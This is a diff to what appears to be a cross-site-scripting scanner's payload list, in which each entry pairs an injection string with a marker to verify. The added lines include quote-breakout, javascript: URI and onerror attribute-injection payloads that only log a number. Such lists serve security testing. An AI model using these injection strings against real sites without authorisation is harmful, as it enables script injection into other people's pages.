@@ -1,3 +1,6 @@
+{"poc":"<ydomx>ydomx</ydomx>","type":"domtag","verify":"ydomx"}
 {"poc":"<script>console.log(12345678)</script>","type":"console","verify":"12345678"}
 {"poc":"<script>document.write('<ydomx>ydomx</ydomx>');</script>","type":"domtag","verify":"ydomx"}
-{"poc":"<script>alert(0);</script>","type":"textplain","verify":"<script>alert(0);"}
+{"poc":"a');console.log(12345678);('","type":"console","verify":"12345678"}
+{"poc":"javascript:console.log(12345678)","type":"console","verify":"12345678"}
+{"poc":"x\" onerror=\"javascript:console.log(12345678)","type":"console","verify":"12345678"}
